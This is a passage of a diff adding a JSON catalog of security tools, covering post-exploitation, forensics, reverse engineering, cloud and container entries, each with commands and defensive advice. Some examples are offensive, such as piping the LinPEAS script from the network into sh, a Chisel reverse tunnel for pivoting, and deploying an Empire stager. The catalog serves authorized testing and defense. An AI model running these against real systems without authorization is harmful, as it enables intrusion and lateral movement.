+                    "command_template": "bloodhound-python -u [user] -p [password] -d [domain] -ns [dc_ip] -c All",
+                    "description": "Uses graph theory to reveal hidden relationships and attack paths in Active Directory environments.",
+                    "example_usage": "bloodhound-python -u 'user@domain.com' -p 'password' -d domain.com -ns 192.168.1.10 -c All",
+                    "tags": ["post_exploitation", "active_directory", "enumeration"],
+                    "defensive_context": "Regularly audit AD permissions, implement principle of least privilege, and monitor for BloodHound-related reconnaissance.",
+                    "risk_level": "medium",
+                    "prerequisites": ["active_directory", "domain_credentials"]
+                },
+                {
+                    "command_id": 1039,
+                    "tool": "LinPEAS",
+                    "command_template": "./linpeas.sh",
+                    "description": "Linux Privilege Escalation Awesome Script that searches for possible paths to escalate privileges on Linux/Unix hosts.",
+                    "example_usage": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+                    "tags": ["privilege_escalation", "linux", "enumeration"],
+                    "defensive_context": "Harden Linux systems following CIS benchmarks, implement proper file permissions, and regularly audit SUID/GUID files.",
+                    "risk_level": "medium",
+                    "prerequisites": ["linux_system", "shell_access"]
+                },
+                {
+                    "command_id": 1040,
+                    "tool": "WinPEAS",
+                    "command_template": "winPEASx64.exe",
+                    "description": "Windows Privilege Escalation Awesome Script that searches for possible privilege escalation paths on Windows hosts.",
+                    "example_usage": "winPEASx64.exe quiet cmd fast",
+                    "tags": ["privilege_escalation", "windows", "enumeration"],
+                    "defensive_context": "Implement least privilege, regularly patch systems, audit service permissions, and monitor for privilege escalation attempts.",
+                    "risk_level": "medium",
+                    "prerequisites": ["windows_system", "shell_access"]
+                },
+                {
+                    "command_id": 1069,
+                    "tool": "Empire",
+                    "command_template": "empire",
+                    "description": "A post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure-Python 2.6/2.7 Linux/OS X agent. Now merged with Starkiller.",
+                    "example_usage": "Start server, start client, generate stager, deploy on target, interact with agent.",
+                    "tags": ["post_exploitation", "c2", "framework", "powershell", "python"],
+                    "defensive_context": "Utilize EDRs, constrain PowerShell execution policies, enable script block logging, and monitor network for C2 traffic.",
+                    "risk_level": "high",
+                    "prerequisites": ["python3", "target_access"]
+                },
+                {
+                    "command_id": 1070,
+                    "tool": "Chisel",
+                    "command_template": "./chisel client [server_ip:port] R:[remote_port]:[local_ip:port]",
+                    "description": "A fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Useful for pivoting into internal networks.",
+                    "example_usage": "Server: ./chisel server -p 8080 --reverse | Client: ./chisel client 10.10.10.10:8080 R:socks",
+                    "tags": ["post_exploitation", "pivoting", "tunneling", "c2"],
+                    "defensive_context": "Monitor for anomalous HTTP/S traffic, especially long-lived connections. Use egress filtering and proxy inspection to detect tunneling.",
+                    "risk_level": "medium",
+                    "prerequisites": ["shell_access", "network_connectivity"]
+                }
+            ]
+        },
+        {
+            "category_name": "Digital Forensics & Incident Response",
+            "category_id": 110,
+            "category_description": "Tools and techniques for investigating security incidents, analyzing evidence, and conducting forensic examinations.",
+            "commands": [
+                {
+                    "command_id": 1041,
+                    "tool": "Autopsy",
+                    "command_template": "autopsy (GUI)",
+                    "description": "Digital forensics platform and graphical interface to The Sleuth Kit with timeline analysis, hash filtering, and keyword search.",
+                    "example_usage": "Launch GUI and create new case, add evidence source (disk image)",
+                    "tags": ["forensics", "investigation", "gui", "analysis"],
+                    "defensive_context": "Maintain proper evidence handling procedures, implement comprehensive logging, and establish incident response capabilities.",
+                    "risk_level": "low",
+                    "prerequisites": ["disk_image", "java"]
+                },
+                {
+                    "command_id": 1042,
+                    "tool": "Volatility",
+                    "command_template": "vol.py -f [memory_dump] [plugin]",
+                    "description": "Advanced memory forensics framework for incident response and malware analysis from RAM captures.",
+                    "example_usage": "vol.py -f memory.dmp windows.info",
+                    "tags": ["memory_forensics", "incident_response", "malware_analysis"],
+                    "defensive_context": "Implement memory protection mechanisms, conduct regular memory analysis training, and maintain memory acquisition capabilities.",
+                    "risk_level": "low",
+                    "prerequisites": ["memory_dump", "python"]
+                },
+                {
+                    "command_id": 1043,
+                    "tool": "Wireshark",
+                    "command_template": "wireshark (GUI) or tshark -i [interface]",
+                    "description": "World's foremost network protocol analyzer with deep inspection of hundreds of protocols and live capture capabilities.",
+                    "example_usage": "tshark -i eth0 -f 'tcp port 80' -w capture.pcap",
+                    "tags": ["network_analysis", "packet_capture", "protocol_analysis"],
+                    "defensive_context": "Use encrypted protocols, implement network segmentation, and monitor for suspicious network traffic patterns.",
+                    "risk_level": "low",
+                    "prerequisites": ["network_access", "root_privileges_for_capture"]
+                },
+                {
+                    "command_id": 1044,
+                    "tool": "Bulk Extractor",
+                    "command_template": "bulk_extractor [options] [image_file]",
+                    "description": "Computer forensics tool that scans disk images, files, or directories and extracts useful information without parsing the file system.",
+                    "example_usage": "bulk_extractor -o output_dir disk_image.dd",
+                    "tags": ["forensics", "data_carving", "evidence_extraction"],
+                    "defensive_context": "Implement data loss prevention, encrypt sensitive data at rest, and securely wipe media before disposal.",
+                    "risk_level": "low",
+                    "prerequisites": ["disk_image"]
+                },
+                {
+                    "command_id": 1071,
+                    "tool": "The Sleuth Kit (TSK)",
+                    "command_template": "fls -r [disk_image]",
+                    "description": "A collection of command-line tools and a C library that allows for forensic analysis of disk images.",
+                    "example_usage": "fls -o 2048 -r disk.dd",
+                    "tags": ["forensics", "disk_analysis", "cli", "incident_response"],
+                    "defensive_context": "Maintain system logs and use file integrity monitoring (FIM) to provide a baseline for forensic analysis.",
+                    "risk_level": "low",
+                    "prerequisites": ["disk_image"]
+                },
+                {
+                    "command_id": 1072,
+                    "tool": "Redline",
+                    "command_template": "Redline.exe (GUI)",
+                    "description": "A free endpoint security tool from FireEye/Mandiant for in-depth memory and file analysis to find signs of malicious activity.",
+                    "example_usage": "Launch Redline, create a collector, run collector on target system, then analyze results in Redline.",
+                    "tags": ["forensics", "incident_response", "endpoint_analysis", "memory_forensics"],
+                    "defensive_context": "Deploy EDR solutions to provide similar endpoint visibility continuously. Establish baselines of normal system activity.",
+                    "risk_level": "low",
+                    "prerequisites": ["windows_system"]
+                }
+            ]
+        },
+        {
+            "category_name": "Reverse Engineering",
+            "category_id": 111,
+            "category_description": "Tools and techniques for analyzing malware, binaries, and understanding software behavior.",
+            "commands": [
+                {
+                    "command_id": 1045,
+                    "tool": "Ghidra",
+                    "command_template": "ghidraRun (GUI)",
+                    "description": "Software reverse engineering suite developed by NSA with disassembly, decompilation, and scripting capabilities.",
+                    "example_usage": "Launch GUI, create project, import binary, and begin analysis",
+                    "tags": ["reverse_engineering", "disassembly", "decompilation"],
+                    "defensive_context": "Use code obfuscation, implement anti-reverse engineering techniques, and conduct regular code reviews.",
+                    "risk_level": "low",
+                    "prerequisites": ["java", "binary_file"]
+                },
+                {
+                    "command_id": 1046,
+                    "tool": "Radare2",
+                    "command_template": "r2 [binary]",
+                    "description": "Free and open-source reverse engineering framework with disassembler, debugger, and forensics capabilities.",
+                    "example_usage": "r2 -AA binary.exe",
+                    "tags": ["reverse_engineering", "disassembly", "debugging"],
+                    "defensive_context": "Implement code signing, use packers cautiously, and conduct security testing throughout development lifecycle.",
+                    "risk_level": "low",
+                    "prerequisites": ["binary_file"]
+                },
+                {
+                    "command_id": 1047,
+                    "tool": "strings",
+                    "command_template": "strings [options] [binary]",
+                    "description": "Displays printable character sequences in binary files, useful for quick analysis of embedded text.",
+                    "example_usage": "strings -n 10 suspicious_file.exe | grep -i 'password'",
+                    "tags": ["reverse_engineering", "quick_analysis", "text_extraction"],
+                    "defensive_context": "Avoid hardcoding sensitive information in binaries, use secure storage for credentials, and strip debug symbols from production builds.",
+                    "risk_level": "low",
+                    "prerequisites": ["binary_file"]
+                },
+                {
+                    "command_id": 1073,
+                    "tool": "x64dbg",
+                    "command_template": "x64dbg.exe (GUI)",
+                    "description": "An open-source x64/x32 debugger for Windows. Used for malware analysis and reverse engineering of Windows executables.",
+                    "example_usage": "Launch x64dbg and attach to a running process or open an executable.",
+                    "tags": ["reverse_engineering", "debugging", "windows", "malware_analysis"],
+                    "defensive_context": "Implement anti-debugging techniques in sensitive applications. Use code obfuscation and packing to hinder analysis.",
+                    "risk_level": "low",
+                    "prerequisites": ["windows_system", "binary_file"]
+                },
+                {
+                    "command_id": 1074,
+                    "tool": "IDA Pro",
+                    "command_template": "ida64.exe (GUI)",
+                    "description": "A commercial, multi-processor disassembler and debugger that is a de-facto industry standard for reverse engineering.",
+                    "example_usage": "Launch IDA Pro, open a binary, and allow auto-analysis to complete before exploring functions.",
+                    "tags": ["reverse_engineering", "disassembly", "decompilation", "commercial"],
+                    "defensive_context": "Secure coding practices and code signing are fundamental defenses. Complex software is harder to reverse engineer effectively.",
+                    "risk_level": "low",
+                    "prerequisites": ["commercial_license", "binary_file"]
+                }
+            ]
+        },
+        {
+            "category_name": "Cloud Security",
+            "category_id": 112,
+            "category_description": "Tools and techniques for assessing the security of cloud environments and configurations.",
+            "commands": [
+                {
+                    "command_id": 1048,
+                    "tool": "Pacu",
+                    "command_template": "python3 pacu.py",
+                    "description": "AWS exploitation framework designed for testing cloud security through offensive security techniques.",
+                    "example_usage": "python3 pacu.py, list modules, run iam__enum_permissions",
+                    "tags": ["cloud", "aws", "exploitation", "enumeration"],
+                    "defensive_context": "Implement least privilege IAM policies, enable CloudTrail logging, use AWS Config for compliance monitoring, and conduct regular security assessments.",
+                    "risk_level": "high",
+                    "prerequisites": ["aws_credentials", "python3"]
+                },
+                {
+                    "command_id": 1049,
+                    "tool": "Scout Suite",
+                    "command_template": "python3 scout.py [cloud_provider]",
+                    "description": "Multi-cloud security auditing tool that assesses cloud environments against security best practices.",
+                    "example_usage": "python3 scout.py aws --access-keys AKIA... --secret-key ...",
+                    "tags": ["cloud", "security_audit", "multi_cloud", "compliance"],
+                    "defensive_context": "Regularly audit cloud configurations, implement cloud security posture management (CSPM), and follow cloud security best practices.",
+                    "risk_level": "low",
+                    "prerequisites": ["cloud_credentials", "python3"]
+                },
+                {
+                    "command_id": 1050,
+                    "tool": "CloudBrute",
+                    "command_template": "cloudbrute -d [domain] -k [keyword] -m [module]",
+                    "description": "Tool to find a company infrastructure, files, and apps on the top cloud providers with multiple permutations.",
+                    "example_usage": "cloudbrute -d example.com -k admin -m storage",
+                    "tags": ["cloud", "reconnaissance", "enumeration"],
+                    "defensive_context": "Implement proper cloud resource naming conventions, use private buckets where appropriate, and monitor for reconnaissance activity.",
+                    "risk_level": "low",
+                    "prerequisites": ["cloud_provider_account"]
+                },
+                {
+                    "command_id": 1075,
+                    "tool": "Prowler",
+                    "command_template": "./prowler [cloud_provider]",
+                    "description": "Security tool for AWS, Azure, and GCP to perform security assessments, auditing, hardening, and incident response.",
+                    "example_usage": "./prowler aws -M json",
+                    "tags": ["cloud", "aws", "azure", "gcp", "security_audit", "compliance"],
+                    "defensive_context": "Use tools like Prowler proactively to identify and remediate misconfigurations. Integrate security checks into CI/CD pipelines.",
+                    "risk_level": "low",
+                    "prerequisites": ["cloud_credentials", "cloud_cli_tool"]
+                },
+                {
+                    "command_id": 1076,
+                    "tool": "Cloudsplaining",
+                    "command_template": "cloudsplaining scan --input-file [iam_policy_file.json]",
+                    "description": "An AWS IAM security assessment tool that identifies violations of least privilege and generates a report.",
+                    "example_usage": "cloudsplaining download --profile my-aws-profile && cloudsplaining scan --input-file iam-data.json",
+                    "tags": ["cloud", "aws", "iam", "least_privilege", "security_audit"],
+                    "defensive_context": "Regularly audit IAM policies for excessive permissions. Use IAM Access Analyzer to identify unintended resource access.",
+                    "risk_level": "low",
+                    "prerequisites": ["aws_credentials", "python3"]
+                }
+            ]
+        },
+        {
+            "category_name": "Container & Kubernetes Security",
+            "category_id": 113,
+            "category_description": "Tools for assessing the security of containerized environments and orchestration platforms.",
+            "commands": [
+                {
+                    "command_id": 1051,
+                    "tool": "Docker Bench Security",
+                    "command_template": "git clone https://github.com/docker/docker-bench-security.git && cd docker-bench-security && sudo ./docker-bench-security.sh",
+                    "description": "Script that checks for dozens of common best-practices around deploying Docker containers in production.",
+                    "example_usage": "sudo ./docker-bench-security.sh",
+                    "tags": ["container", "docker", "security_benchmark", "compliance"],
+                    "defensive_context": "Follow Docker security benchmarks, use minimal base images, implement image scanning, and enforce runtime security policies.",
+                    "risk_level": "low",
+                    "prerequisites": ["docker", "git"]
+                },
+                {
+                    "command_id": 1052,
+                    "tool": "kube-hunter",
+                    "command_template": "kube-hunter --remote [target]",
+                    "description": "Hunts for security weaknesses in Kubernetes clusters both from outside (remote) and inside (pod) perspectives.",
+                    "example_usage": "kube-hunter --remote 192.168.1.100",
+                    "tags": ["kubernetes", "security", "vulnerability_assessment"],
+                    "defensive_context": "Harden Kubernetes clusters following CIS benchmarks, implement network policies, use Pod Security Standards, and enable audit logging.",
+                    "risk_level": "medium",
+                    "prerequisites": ["kubernetes_cluster", "python3"]
+                },
+                {
+                    "command_id": 1053,
+                    "tool": "Trivy",
+                    "command_template": "trivy image [image_name]",
+                    "description": "Simple and comprehensive vulnerability scanner for containers and other artifacts suitable for CI/CD.",
+                    "example_usage": "trivy image python:3.4-alpine",
+                    "tags": ["container", "vulnerability", "scanner", "ci_cd"],
+                    "defensive_context": "Implement container image scanning in CI/CD pipelines, use minimal base images, and maintain patch management for container images.",
+                    "risk_level": "low",
+                    "prerequisites": ["container_image"]
+                },
+                {
+                    "command_id": 1077,
+                    "tool": "Kube-bench",
+                    "command_template": "kube-bench",
+                    "description": "Checks whether Kubernetes is deployed securely by running the checks documented in the CIS Kubernetes Benchmark.",
+                    "example_usage": "kube-bench run --targets master,node",
+                    "tags": ["kubernetes", "security_benchmark", "compliance", "hardening"],
+                    "defensive_context": "Integrate kube-bench into your cluster deployment process to ensure consistent adherence to security benchmarks.",
+                    "risk_level": "low",
+                    "prerequisites": ["kubernetes_cluster_access"]
+                },
+                {
+                    "command_id": 1078,
+                    "tool": "Falco",
+                    "command_template": "falco",
+                    "description": "A cloud-native runtime security tool, acting as a threat detection engine for Kubernetes.",
+                    "example_usage": "Install Falco on Kubernetes nodes and monitor logs in /var/log/syslog or configured output.",
+                    "tags": ["kubernetes", "runtime_security", "threat_detection", "container"],
+                    "defensive_context": "Deploy runtime security monitoring to detect anomalous behavior within containers and on nodes, such as unexpected shell execution or file access.",
+                    "risk_level": "low",
+                    "prerequisites": ["kubernetes_cluster"]
+                }
+            ]
+        }
+    ],
+    "usage_guidelines": {
+        "ethical_considerations": [
+            "Always obtain proper authorization before testing",
+            "Respect scope and boundaries defined in engagement agreements",
+            "Follow responsible disclosure procedures for found vulnerabilities",
+            "Do not use these tools for malicious purposes"
+        ],
+        "legal_warnings": [
+            "Unauthorized use of these tools may violate local and international laws",
+            "Maintain detailed documentation of authorized testing activities",
+            "Understand and comply with relevant regulations (CFAA, GDPR, etc.)"
+        ],
+        "best_practices": [
+            "Use dedicated testing environments when possible",
+            "Maintain comprehensive notes and evidence collection",
+            "Communicate findings clearly to stakeholders",
+            "Follow up on remediation activities"
+        ]
+    },
+    "tool_categories_index": {
+        "reconnaissance": [1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1054, 1055],
+        "scanning": [1009, 1010, 1011, 1012, 1056, 1057],
+        "web_security": [1013, 1014, 1015, 1016, 1017, 1018, 1058, 1059],
+        "vulnerability_assessment": [1019, 1020, 1021, 1022, 1060, 1061],
+        "exploitation": [1023, 1024, 1025, 1062, 1063],
+        "password_attacks": [1026, 1027, 1028, 1029, 1064, 1065],
+        "wireless": [1030, 1031, 1032, 1066, 1067],
+        "social_engineering": [1033, 1034, 1035, 1068],
+        "post_exploitation": [1036, 1037, 1038, 1039, 1040, 1069, 1070],
+        "forensics": [1041, 1042, 1043, 1044, 1071, 1072],
+        "reverse_engineering": [1045, 1046, 1047, 1073, 1074],
+        "cloud_security": [1048, 1049, 1050, 1075, 1076],
+        "container_security": [1051, 1052, 1053, 1077, 1078]
+    }
+}
